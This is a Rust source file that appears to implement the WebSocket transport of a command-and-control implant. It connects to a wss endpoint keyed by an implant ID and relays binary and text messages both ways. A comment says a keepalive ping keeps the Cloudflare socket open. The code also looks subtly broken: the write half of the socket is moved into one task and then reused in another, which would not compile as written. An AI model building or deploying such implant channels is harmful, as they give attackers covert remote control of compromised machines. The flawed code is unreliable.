use anyhow::Result;
use futures::{SinkExt, StreamExt};
use tokio::sync::mpsc;
use tokio_tungstenite::tungstenite::protocol::Message;
use tokio_tungstenite::connect_async;
use tracing::{error, info};
use url::Url;

pub struct WsTransport {
    pub url: String,
    pub implant_id: String,
}

impl WsTransport {
    pub fn new(domain: &str, implant_id: &str) -> Self {
        Self {
            url: format!("wss://{}/t/wss/{}", domain, implant_id),
            implant_id: implant_id.to_string(),
        }
    }

    pub async fn connect(
        &self,
        mut rx: mpsc::Receiver<Vec<u8>>,
        tx: mpsc::Sender<Vec<u8>>,
    ) -> Result<()> {
        let url = Url::parse(&self.url)?;
        info!("Connecting to WSS: {}", self.url);

        let (ws_stream, _) = connect_async(url).await?;
        info!("WSS CONNECTED: {}", self.url);
        let (mut write, mut read) = ws_stream.split();

        let send_task = tokio::spawn(async move {
            while let Some(msg) = rx.recv().await {
                if write.send(Message::Binary(msg)).await.is_err() {
                    break;
                }
            }
        });

        let recv_task = tokio::spawn(async move {
            while let Some(msg) = read.next().await {
                match msg {
                    Ok(Message::Binary(data)) => {
                        if tx.send(data).await.is_err() {
                            break;
                        }
                    }
                    Ok(Message::Text(text)) => {
                        if tx.send(text.into_bytes()).await.is_err() {
                            break;
                        }
                    }
                    Ok(Message::Close(frame)) => {
                        info!("WSS server sent Close frame: {:?}", frame);
                        break;
                    }
                    Ok(Message::Ping(_)) | Ok(Message::Pong(_)) => {
                        // handled by tungstenite automatically
                    }
                    Err(e) => {
                        error!("WSS recv error: {}", e);
                        break;
                    }
                }
            }
        });

        // Ping task to keep Cloudflare socket alive (30s)
        let ping_task = tokio::spawn(async move {
            loop {
                tokio::time::sleep(tokio::time::Duration::from_secs(30)).await;
                if write.send(Message::Ping(vec![])).await.is_err() {
                    break;
                }
            }
        });

        tokio::select! {
            _ = send_task => {},
            _ = recv_task => {},
            _ = ping_task => {},
        }
        
        info!("WSS session ended: {}", self.url);
        Ok(())
    }
}
